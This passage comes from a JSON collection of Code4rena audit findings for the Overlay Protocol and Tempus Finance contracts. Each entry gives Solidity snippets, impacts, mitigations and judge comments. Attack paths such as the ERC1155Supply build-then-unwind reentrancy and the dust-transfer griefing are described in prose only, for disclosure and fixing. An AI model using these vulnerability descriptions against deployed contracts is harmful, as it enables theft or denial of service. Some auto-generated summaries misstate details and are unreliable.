      "content": "_Submitted by cmichel_\n\nThe `OverlayV1UniswapV3Market.fetchPricePoint` tries to compute the market depth in OVL terms as `marketLiquidity (in ETH) / ovlPrice (in ETH per OVL)`.\nTo get the market liquidity *in ETH* (and not the other token pair), it uses the `ethIs0` boolean.\n\n```solidity\n_marketLiquidity = ethIs0\n    ? ( uint256(_liquidity) << 96 ) / _sqrtPrice\n    : FullMath.mulDiv(uint256(_liquidity), _sqrtPrice, X96);\n```\n\nHowever, `ethIs0` boolean refers to the `ovlFeed`, whereas the `_liquidity` refers to the `marketFeed`, and therefore the `ethIs0` boolean has nothing to do with the *market* feed where the liquidity is taken from:\n\n```solidity\n// in constructor, if token0 is eth refers to ovlFeed\nethIs0 = IUniswapV3Pool(_ovlFeed).token0() == _eth;\n\n// in fetchPricePoint, _liquidity comes from different market feed\n( _ticks, _liqs ) = IUniswapV3Pool(marketFeed).observe(_secondsAgo);\n_marketLiquidity = ethIs0\n    ? ( uint256(_liquidity) << 96 ) / _sqrtPrice\n    : FullMath.mulDiv(uint256(_liquidity), _sqrtPrice, X96);\n```\n\n#### Impact\n\nIf the `ovlFeed` and `marketFeed` do not have the same token position for the ETH pair (ETH is either token 0 or token 1 for **both** pairs), then the market liquidity & depth is computed wrong (inverted).\nFor example, the `OverlayV1Market.depth()` function will return a wrong depth which is used in the market cap computation.\n\n#### Recommended Mitigation Steps\n\nIt seems that `marketFeed.token0() == WETH` should be used in `fetchPricePoint` to compute the liquidity instead of `ovlFeed.token0() == WETH`.\n\n**[realisation (Overlay) confirmed](https://github.com/code-423n4/2021-11-overlay-findings/issues/83#issuecomment-985656027):**\n > Yeah, was aware of this, just hadn't finalized it in the code as of yet. \n\n\n\n",
      "summary": "\nThe report highlights a bug in the `OverlayV1UniswapV3Market.fetchPricePoint` function, which is used to compute market depth in OVL terms. The function uses a boolean called `ethIs0` to determine the market liquidity in ETH, but this boolean only refers to the `ovlFeed` and not the `marketFeed` where the liquidity is taken from. This can result in incorrect market depth and market cap calculations if the `ovlFeed` and `marketFeed` do not have the same token position for the ETH pair. The recommended solution is to use `marketFeed.token0() == WETH` instead of `ovlFeed.token0() == WETH` in the `fetchPricePoint` function. This issue has been confirmed and is being worked on by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/83",
      "tags": [],
      "finders": []
    },
    {
      "id": "1072",
      "title": "[M-09] Improper Upper Bound Definition on the Fee",
      "impact": "MEDIUM",
      "content": "_Submitted by defsec, also found by gzeon, nathaniel, WatchPug, cmichel,  and pauliax_\n\n#### Impact\n\nIn the `adjustGlobalParams` function on line 1603 of \"<https://github.com/code-423n4/2021-11-overlay/blob/main/contracts/mothership/OverlayV1Mothership.sol#L1630>\", `adjustGlobalParams` function does not have any upper or lower bounds. Values that are too large will lead to reversions in several critical functions.\n\n#### Proof of Concept\n\n*   The `setFee` function that begins on line 163 of `adjustGlobalParams` sets the liquidity and transaction fee rates for the market in which the function is called. In this context, the transaction fee is the percentage of a transaction that is taken by the protocol and moved to a designated reserve account. As the name suggests, transaction fees factor in to many of the essential transaction types performed within the system.\n*   Navigate to \"<https://github.com/code-423n4/2021-11-overlay/blob/main/contracts/mothership/OverlayV1Mothership.sol#L163>\" contract and go to line #163.\n*   On the function there is no upper and lower bound defined. Therefore, users can pay higher fees.\n\n#### Tools Used\n\nNone\n\n#### Recommended Mitigation Steps\n\nConsider defining upper and lower bounds on the `adjustGlobalParams` function.\n\n**[mikeyrf (Overlay) confirmed](https://github.com/code-423n4/2021-11-overlay-findings/issues/77)** \n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/77#issuecomment-997195772):**\n > Several wardens have marked this issue as high severity due to the potential for governance to rug users. Several have marked it as low risk because it's really just a bounding issue and presumably governance would not willingly choose to rug their users. \n> \n> I view this a medium severity issue. If exploited, the impact would be high. The likelihood that it would be exploited intentionally or happen unintentionally is low, but not impossible as the uninformed users dynamic could come into play here.\n\n",
      "summary": "\nThis bug report outlines a vulnerability in the adjustGlobalParams function on line 1630 of the OverlayV1Mothership.sol contract. This function is used to set the liquidity and transaction fee rates for the market, and it does not have any upper or lower bounds. This means that users can pay higher fees than necessary, which can lead to reversions in several critical functions. To mitigate this vulnerability, it is recommended to define upper and lower bounds on the adjustGlobalParams function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/77",
      "tags": [],
      "finders": [
        "pauliax",
        "cmichel",
        "gzeon",
        "WatchPug",
        "nathaniel",
        "defsec"
      ]
    },
    {
      "id": "1071",
      "title": "[M-08] OverlayToken.burn function could burn tokens of any user",
      "impact": "MEDIUM",
      "content": "_Submitted by xYrYuYx_\n\n#### Impact\n\n<https://github.com/code-423n4/2021-11-overlay/blob/main/contracts/ovl/OverlayToken.sol#L366>\n\nThe burner could burn any amount of tokens of any user.\nThis is not good solution of burn\n\n#### Tools Used\n\nManual\n\n#### Recommended Mitigation Steps\n\nUpdate burn function for only owner can burn his tokens.\nNow, `ovl.burn` function is used in OverlayV1OVLCollateral.sol file, and these updates won’t make any issue in protocol.\n\n**[mikeyrf (Overlay) acknowledged](https://github.com/code-423n4/2021-11-overlay-findings/issues/22#issuecomment-988249666):**\n > sponsor acknowledged reason - `onlyBurner` modifier with access control privileges prevent unexpected burn amounts, given only collateral managers are given burn permissions\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the OverlayToken.sol file of the 2021-11-overlay repository. It was discovered manually, and the impact of the vulnerability is that the burner could burn any amount of tokens of any user. This is not a good solution for burning tokens. The recommended mitigation step is to update the burn function so that only the owner can burn their tokens. This update should not affect the protocol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/22",
      "tags": [],
      "finders": [
        "xYrYuYx"
      ]
    },
    {
      "id": "1070",
      "title": "[M-07] Cached version of ovl may be outdated",
      "impact": "MEDIUM",
      "content": "_Submitted by pauliax_\n\n#### Impact\n\ncontract OverlayV1OVLCollateral and OverlayV1Governance cache ovl address:\n\n```solidity\nIOverlayTokenNew immutable public ovl;\n```\n\nThis variable is initialized in the constructor and fetched from the mothership contract:\n\n```solidity\nmothership = IOverlayV1Mothership(_mothership);\novl = IOverlayV1Mothership(_mothership).ovl();\n```\n\novl is declared as immutable and later contract interacts with this cached version. However, mothership contains a setter function, so the governor can point it to a new address:\n\n```solidity\nfunction setOVL (address _ovl) external onlyGovernor {\n    ovl = _ovl;\n}\n```\n\n`OverlayV1OVLCollateral` and `OverlayV1Governance` will still use this old cached value.\n\n#### Recommended Mitigation Steps\n\nConsider if this was intended, or you want to remove this cached version and always fetch on the go (this will increase the gas costs though).\n\n**[realisation (Overlay) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/129#issuecomment-978085480):**\n > This is just a detail we were yet to settle on but definitely were going to as we got the contracts to a totally deployable state.\n\n**[mikeyrf (Overlay) disagreed with severity](https://github.com/code-423n4/2021-11-overlay-findings/issues/129#issuecomment-989289973):**\n > disagree w severity reason - would put this at 1 - Low Risk given the governor would be responsible for properly setting\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/129#issuecomment-998216930):**\n > I agree with the warden that this constitutes a medium risk.\n> \n> From the judging criteria (emphasis mine):\n> > 2 — Med (M): vulns have a risk of 2 and are considered “Medium” severity when **assets are not at direct risk, but the function of the protocol or its availability could be impacted**, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n\n\n\n",
      "summary": "\nThis bug report concerns two contracts, OverlayV1OVLCollateral and OverlayV1Governance, that cache an address of a token, ovl, that is declared as immutable. This address is initialized in the constructor and fetched from the mothership contract. However, the mothership contract contains a setter function that allows the governor to point the address to a new address. This means that the two contracts will still use the old cached value. To fix this issue, the developer must consider if this was intended, or if the cached version should be removed and the address should be fetched on the go. This will increase the gas costs, however.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/129",
      "tags": [],
      "finders": [
        "pauliax"
      ]
    },
    {
      "id": "1069",
      "title": "[M-06] Timelock and events for governor functions",
      "impact": "MEDIUM",
      "content": "_Submitted by pauliax_\n\n#### Impact\n\nThere are contracts that contain functions that change important parameters of the system, e.g. `OverlayV1Mothership` has `setOVL`, `initializeMarket`, `disableMarket`, `enableMarket`, `initializeCollateral`, `enableCollateral`, `disableCollateral`, `adjustGlobalParams`. None of these functions emit events, nor they are timelocked. Usually, it is a good practice to give time for users to react and adjust to changes.\n\nA similar issue was submitted in a previous contest and assigned a severity of Medium: <https://github.com/code-423n4/2021-09-swivel-findings/issues/101>\n\n#### Recommended Mitigation Steps\n\nConsider using a timelock for critical params of the system and emitting events to inform the outside world.\n\n**[realisation (Overlay) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/120#issuecomment-978096272):**\n > The plan has been to have a timelock at some point in the protocol. Probably on whatever is the admin for the mothership. But this just had to be evaluated. It might be on the market contract itself, or on the addresses granted the role of admin.\n\n**[mikeyrf (Overlay) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/120#issuecomment-987979184):**\n > duplicate #64 \n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/120#issuecomment-997204779):**\n > I'm removing the duplicate in this case because issue #64 refers exclusively to the events. This issue is focused primarily on the lack of governance timelock, which has traditionally been considered a medium severity issue.\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in contracts that contain functions that change important parameters of the system. These functions do not emit events, nor are they timelocked, which means that users do not have time to adjust to changes. This vulnerability was previously assigned a severity of Medium. The recommended mitigation steps are to use a timelock for critical params of the system and to emit events to inform the outside world. This will give users time to adjust to changes.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/120",
      "tags": [],
      "finders": [
        "pauliax"
      ]
    },
    {
      "id": "1068",
      "title": "[M-05] Fee double counting for underwater positions",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh_\n\n#### Impact\n\nActual available fees are less than recorded. That's because a part of them corresponds to underwater positions, and will not have the correct amount stored with the contract: when calculation happens the fee is recorded first, then there is a check for position health, and the funds are channeled to cover the debt firsthand. This way in a case of unfunded position the fee is recorded, but cannot be allocated, so the fees accounted can be greater than the value of fees stored.\n\nThis can lead to fee withdrawal malfunction, i.e. `disburse()` will burn more and attempt to transfer more than needed. This leads either to inability to withdraw fees when disburse is failing due to lack of funds, or funds leakage to fees and then inability to perform other withdrawals because of lack of funds.\n\n#### Proof of Concept\n\nThe fees are accounted for before position health check and aren't corrected thereafter when there is a shortage of funds.\n\n<https://github.com/code-423n4/2021-11-overlay/blob/main/contracts/collateral/OverlayV1OVLCollateral.sol#L311>\n\n#### Recommended Mitigation Steps\n\nAdjust fees after position health check: accrue fees only on a remaining part of position that is available after taking debt into account.\n\nNow:\n```solidity\nuint _feeAmount = _userNotional.mulUp(mothership.fee());\n\nuint _userValueAdjusted = _userNotional - _feeAmount;\nif (_userValueAdjusted > _userDebt) _userValueAdjusted -= _userDebt;\nelse _userValueAdjusted = 0;\n```\nTo be:\n```solidity\nuint _feeAmount = _userNotional.mulUp(mothership.fee());\n\nuint _userValueAdjusted = _userNotional - _feeAmount;\nif (_userValueAdjusted > _userDebt) {\n    _userValueAdjusted -= _userDebt;\n} else {\n    _userValueAdjusted = 0;\n    _feeAmount = _userNotional > _userDebt ? _userNotional - _userDebt : 0;\n}\n```\n**[mikeyrf (Overlay) confirmed](https://github.com/code-423n4/2021-11-overlay-findings/issues/134)**\n\n",
      "summary": "\nThis bug report is about the vulnerability of fees being recorded before position health check in OverlayV1OVLCollateral.sol. This can lead to fee withdrawal malfunction, i.e. disburse() will burn more and attempt to transfer more than needed. This can result in either inability to withdraw fees when disburse fails due to lack of funds, or funds leakage to fees and then inability to perform other withdrawals due to lack of funds. The recommended mitigation step is to adjust the fees after position health check. This can be done by accruing fees only on the remaining part of the position that is available after taking debt into account. The code should be adjusted from the current code to the suggested code provided in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/134",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "1067",
      "title": "[M-04] _totalSupply not updated in _transferMint() and _transferBurn() ",
      "impact": "MEDIUM",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe functions _transferMint() and _transferBurn() of OverlayToken.sol don't update _totalSupply.\nWhereas the similar functions _mint() and _burn() do update _totalSupply.\n\nThis means that _totalSupply and totalSupply() will not show a realistic view of the total OVL tokens.\n\nFor the protocol itself it isn't such a problem because this value isn't used in the protocol (as far as I can see).\nBut other protocols building on Overlay may use it, as well as user interfaces and analytic platforms.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L349-L364\n```JS\nfunction _mint( address account, uint256 amount) internal virtual {\n   ...\n      _totalSupply += amount;\n\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L376-L395\n```JS\nfunction _burn(address account, uint256 amount) internal virtual {\n   ...\n        _totalSupply -= amount;\n\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L194-L212\n\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L268-L286\n\n## Tools Used\n\n## Recommended Mitigation Steps\nUpdate _totalSupply  in _transferMint() and _transferBurn()",
      "summary": "\nA bug has been reported in the OverlayToken.sol contract. The functions _transferMint() and _transferBurn() do not update the _totalSupply variable, while the similar functions _mint() and _burn() do update the _totalSupply variable. This means that the _totalSupply and totalSupply() will not show a realistic view of the total OVL tokens, which could be used by other protocols, user interfaces, and analytic platforms. The bug can be found in the following sections of the contract: _mint() and _burn() (lines 349-364 and 376-395 respectively) and _transferMint() and _transferBurn() (lines 194-212 and 268-286 respectively). The recommended mitigation step is to update _totalSupply in _transferMint() and _transferBurn().",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/59",
      "tags": [],
      "finders": [
        "harleythedog",
        "gpersoon",
        "cmichel",
        "xYrYuYx",
        "WatchPug",
        "hubble",
        "defsec"
      ]
    },
    {
      "id": "1066",
      "title": "[M-03] Can’t enableCollateral after a disableCollateral ",
      "impact": "MEDIUM",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe function disableCollateral of OverlayV1Mothership.sol doesn't set collateralActive[_collateral] = false;\nBut it does revoke the roles.\n\nNow enableCollateral  can never be used because collateralActive[_collateral] ==true  and it will never pass the second require.\nSo you can never grant the roles again.\n\nNote: enableCollateral also doesn't set collateralActive[_collateral] = true\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/mothership/OverlayV1Mothership.sol#L133-L153\n\n```JS\n function enableCollateral (address _collateral) external onlyGovernor {\n        require(collateralExists[_collateral], \"OVLV1:!exists\");\n        require(!collateralActive[_collateral], \"OVLV1:!disabled\");\n        OverlayToken(ovl).grantRole(OverlayToken(ovl).MINTER_ROLE(), _collateral);\n        OverlayToken(ovl).grantRole(OverlayToken(ovl).BURNER_ROLE(), _collateral);\n    }\n\n    function disableCollateral (address _collateral) external onlyGovernor {\n        require(collateralActive[_collateral], \"OVLV1:!enabled\");\n        OverlayToken(ovl).revokeRole(OverlayToken(ovl).MINTER_ROLE(), _collateral);\n        OverlayToken(ovl).revokeRole(OverlayToken(ovl).BURNER_ROLE(), _collateral);\n    }\n```\n\n## Tools Used\n\n## Recommended Mitigation Steps\nIn function enableCollateral() add the following (after the require):\ncollateralActive[_collateral] = true;\n\nIn function disableCollateral add the following (after the require):\ncollateralActive[_collateral] = false;",
      "summary": "\nA bug has been reported by gpersoon in the OverlayV1Mothership.sol code. The function disableCollateral does not set collateralActive[_collateral] to false, but it does revoke the roles. This means that enableCollateral can never be used again, as collateralActive[_collateral] is still true and it will never pass the second require. Additionally, enableCollateral does not set collateralActive[_collateral] to true.\n\nThe recommended mitigation steps are to add collateralActive[_collateral] = true; to the function enableCollateral(), and collateralActive[_collateral] = false; to the function disableCollateral(). This will ensure that the roles are revoked and can be granted again, as collateralActive[_collateral] will be set to the correct value.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/55",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "1065",
      "title": "[M-02] pow() is missing check on input parameters with 0 value",
      "impact": "MEDIUM",
      "content": "_Submitted by gpersoon_\n\n#### Impact\n\nThe contract LogExpMath.sol seems to be a fork of the balancer LogExpMath.sol contract.\nIt is mostly similar, except for checks for x and y being 0 in the beginning of the function `pow()`, see below.\n\nThis omission might lead to unexpected results.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/libraries/LogExpMath.sol#L93-L110>\n\n```JS\n function pow(uint256 x, uint256 y) internal pure returns (uint256) {\n        unchecked {\n        _require(x < 2**255, Errors.X_OUT_OF_BOUNDS);\n```\n\n<https://github.com/balancer-labs/balancer-v2-monorepo/blob/master/pkg/solidity-utils/contracts/math/LogExpMath.sol#L93-L109>\n\n```JS\nfunction pow(uint256 x, uint256 y) internal pure returns (uint256) {\n    if (y == 0) {\n        // We solve the 0^0 indetermination by making it equal one.\n        return uint256(ONE_18);\n    }\n\n    if (x == 0) {\n        return 0;\n    }      \n    _require(x < 2**255, Errors.X_OUT_OF_BOUNDS);\n```\n\n#### Recommended Mitigation Steps\n\nCheck if the extra code of the balance contract is useful and if so add it.\n\n**[realisation (Overlay) disputed](https://github.com/code-423n4/2021-11-overlay-findings/issues/54#issuecomment-988278760):**\n > Out of scope\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/54#issuecomment-997201531):**\n > I disagree with sponsor regarding scope. The [Contracts section of the Contest Scope](https://github.com/code-423n4/2021-11-overlay/tree/914bed22f190ebe7088194453bab08c424c3f70c#contracts) lists several contracts which rely on `contracts/libraries/FixedPoint.sol`. This contract uses the `pow` function containing the issue described. The warden has not described an exact attack but has show a math issue, which can certainly lead to a hypothetical loss of funds. Medium severity is appropriate and sponsor should definitely fix this.\n\n\n\n",
      "summary": "\nA bug has been identified in the contract LogExpMath.sol. This contract seems to be a fork of the balancer LogExpMath.sol contract, but it is missing some checks for x and y being 0 in the beginning of the function pow(). This omission could lead to unexpected results. The code snippets from both contracts can be found in the Proof of Concept section of the report. It is recommended that the extra code of the balance contract is added if it is useful.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/54",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "1064",
      "title": "[M-01] isUnderwater returns opposite boolean for short positions",
      "impact": "MEDIUM",
      "content": "_Submitted by harleythedog_\n\n#### Impact\n\nThe function `isUnderwater` should return true if the position value is < 0. In the case of a short position, this is when oi \\* (2 - priceFrame) - debt < 0 (based on the logic given in the \\_value function). Rearranging this equation, a short position is underwater if oi \\* 2 < oi \\* priceFrame + debt. However, in the function `\\_isUnderwater` in Position.sol, the left and right side of this equation is flipped, meaning that the function will return the opposite of what it should when called on short positions.\n\nFortunately, the V1 implementation of `OverlayOVLCollateral` does not directly use the `isUnderwater` function in major control flow changes. However, line 304 of OverlayV1OVLCollateral.sol is a comment that says:\n\n// TODO: think through edge case of underwater position ... and fee adjustments ...\n\nwhich hints that this function is going to be used to deal with underwater positions. As a result, this issue would have a huge impact if not properly dealt with.\n\n#### Proof of Concept\n\nSee code for `\\_isUnderwater` here: <https://github.com/code-423n4/2021-11-overlay/blob/1833b792caf3eb8756b1ba5f50f9c2ce085e54d0/contracts/libraries/Position.sol#L70>\n\nNotice that for short positions the inequality is flipped from what it should be (indeed, when self.debt is higher it is more likely that `isUnder` will be false, which is obviously incorrect).\n\nAlso, see the TODO comment here that shows `isUnderwater` is important: <https://github.com/code-423n4/2021-11-overlay/blob/1833b792caf3eb8756b1ba5f50f9c2ce085e54d0/contracts/collateral/OverlayV1OVLCollateral.sol#L304>\n\n#### Tools Used\n\nInspection\n\n#### Recommended Mitigation Steps\n\nFlip the left and right side of the inequality for short positions in `\\_isUnderwater`.\n\n**[mikeyrf (Overlay) disagreed with severity](https://github.com/code-423n4/2021-11-overlay-findings/issues/53#issuecomment-988281184):**\n > disagree with severity - `isUnderwater()` isn't used anywhere in the collateral manager and markets. Is more for information purposes, so would rate this at a severity of 2 - Medium in the event we had actually used this function for something more important\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/53#issuecomment-997196446):**\n > I agree with the sponsor here. This represents a severe, but hypothetical issue.\n\n\n\n",
      "summary": "\nThis bug report describes a vulnerability in the function _isUnderwater in Position.sol which is used to determine if a position is underwater. The function should return true if the position value is less than 0, however, for short positions, the left and right side of the equation are flipped, meaning the function will return the opposite of what it should. This could have a huge impact if not dealt with properly. The bug was found through inspection, and the recommended mitigation step is to flip the left and right side of the inequality for short positions in _isUnderwater.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/53",
      "tags": [],
      "finders": [
        "harleythedog"
      ]
    },
    {
      "id": "1063",
      "title": "[H-02] OZ ERC1155Supply vulnerability",
      "impact": "HIGH",
      "content": "_Submitted by pauliax, also found by hubble and defsec_\n\n#### Impact\n\nOverlay uses OZ contracts version 4.3.2:\n\n```yaml\n  dependencies:\n    - OpenZeppelin/openzeppelin-contracts@4.3.2\n```\n\nand has a contract that inherits from ERC1155Supply:\n\n```solidity\n  contract OverlayV1OVLCollateral is ERC1155Supply\n```\n\nThis version has a recently discovered vulnerability:\n<https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-wmpv-c2jp-j2xg>\n\nIn your case, function unwind relies on totalSupply when calculating `\\_userNotional`, `\\_userDebt`, `\\_userCost`, and `\\_userOi`, so a malicious actor can exploit this vulnerability by first calling 'build' and then on callback 'unwind' in the same transaction before the total supply is updated.\n\n#### Recommended Mitigation Steps\n\nConsider updating to a patched version of 4.3.3.\n\n**[mikeyrf (Overlay) confirmed](https://github.com/code-423n4/2021-11-overlay-findings/issues/127)**\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the Overlay contracts version 4.3.2, which is used in the application. The vulnerability is related to the ERC1155Supply contract, and it can be exploited by a malicious actor by first calling the 'build' and then 'unwind' functions in the same transaction before the total supply is updated. The recommended mitigation step is to update to a patched version of 4.3.3.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/127",
      "tags": [
        "ERC1155"
      ],
      "finders": [
        "hubble  defsec",
        "pauliax"
      ]
    },
    {
      "id": "1062",
      "title": "[H-01] OverlayV1UniswapV3Market computes wrong market liquidity",
      "impact": "HIGH",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThe `OverlayV1UniswapV3Market.fetchPricePoint` tries to compute the market depth in OVL terms as `marketLiquidity (in ETH) / ovlPrice (in ETH per OVL)`.\nTo get the market liquidity _in ETH_ (and not the other token pair), it uses the `ethIs0` boolean.\n\n```solidity\n_marketLiquidity = ethIs0\n    ? ( uint256(_liquidity) << 96 ) / _sqrtPrice\n    : FullMath.mulDiv(uint256(_liquidity), _sqrtPrice, X96);\n```\n\nHowever, `ethIs0` boolean refers to the `ovlFeed`, whereas the `_liquidity` refers to the `marketFeed`, and therefore the `ethIs0` boolean has nothing to do with the _market_ feed where the liquidity is taken from:\n\n```solidity\n// in constructor, if token0 is eth refers to ovlFeed\nethIs0 = IUniswapV3Pool(_ovlFeed).token0() == _eth;\n\n// in fetchPricePoint, _liquidity comes from different market feed\n( _ticks, _liqs ) = IUniswapV3Pool(marketFeed).observe(_secondsAgo);\n_marketLiquidity = ethIs0\n    ? ( uint256(_liquidity) << 96 ) / _sqrtPrice\n    : FullMath.mulDiv(uint256(_liquidity), _sqrtPrice, X96);\n```\n\n## Impact\nIf the `ovlFeed` and `marketFeed` do not have the same token position for the ETH pair (ETH is either token 0 or token 1 for **both** pairs), then the market liquidity & depth is computed wrong (inverted).\nFor example, the `OverlayV1Market.depth()` function will return a wrong depth which is used in the market cap computation.\n\n## Recommended Mitigation Steps\nIt seems that `marketFeed.token0() == WETH` should be used in `fetchPricePoint` to compute the liquidity instead of `ovlFeed.token0() == WETH`.",
      "summary": "\nThis bug report is about the `OverlayV1UniswapV3Market.fetchPricePoint` function, which tries to compute the market depth in OVL terms. The code uses the `ethIs0` boolean to get the market liquidity _in ETH_ (and not the other token pair), however, `ethIs0` refers to the `ovlFeed`, whereas the `_liquidity` refers to the `marketFeed`, and thus the boolean has nothing to do with the _market_ feed where the liquidity is taken from.\n\nThe impact of this bug is that if the `ovlFeed` and `marketFeed` do not have the same token position for the ETH pair (ETH is either token 0 or token 1 for **both** pairs), then the market liquidity & depth is computed wrong (inverted). For example, the `OverlayV1Market.depth()` function will return a wrong depth which is used in the market cap computation.\n\nThe recommended mitigation step is that `marketFeed.token0() == WETH` should be used in `fetchPricePoint` to compute the liquidity instead of `ovlFeed.token0() == WETH`.",
      "quality_score": 4,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/83",
      "tags": [
        "Wrong Math",
        "Business Logic"
      ],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "42297",
      "title": "[M-02] `depositAndFix` can be made to fail",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_.\n\nThere's a griefing attack where an attacker can make any user transaction for `TempusController.depositAndFix` fail.\nIn `_depositAndFix`, `swapAmount` many yield shares are swapped to principal where `swapAmount` is derived from the function arguments.\nA final `assert(yieldShares.balanceOf(address(this)) == 0)` statement checks that the yield shares of the contract are zero after the swap.\nThis is only true if no other yield shares were already in the contract.\n\nHowever, an attacker can frontrun this call and send the smallest unit of yield shares to the contract which then makes the original deposit-and-fix transaction fail.\n\n#### Impact\n\nAll `depositAndFix` calls can be made to fail and this function becomes unusable.\n\n#### Recommended Mitigation Steps\n\nRemove the `assert` check.\n\n**[mijovic confirmed](https://github.com/code-423n4/2021-10-tempus-findings/issues/20#issuecomment-948017482):**\n > Good catch. This can block users from doing this action via controller\n\n**[mijovic patched](https://github.com/code-423n4/2021-10-tempus-findings/issues/20#issuecomment-948350220):**\n > Fixed in https://github.com/tempus-finance/tempus-protocol/pull/370\n",
      "summary": "\nThe report describes a bug in the Tempus Protocol, where an attacker can make a specific function, `TempusController.depositAndFix`, fail. This function is used to swap yield shares to principal shares, and a check is in place to ensure that all yield shares are zero after the swap. However, the attacker can send a small amount of yield shares to the contract, causing the check to fail and making the function unusable. The recommended solution is to remove the check, and the bug has been confirmed and patched by the developer.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tempus Finance",
      "source_link": "https://code4rena.com/reports/2021-10-tempus",
      "github_link": "https://github.com/code-423n4/2021-10-tempus-findings/issues/20",
      "tags": [],
      "finders": []
    },
    {
      "id": "42296",
      "title": "[M-01] `exitTempusAMM` can be made to fail",
      "impact": "MEDIUM",
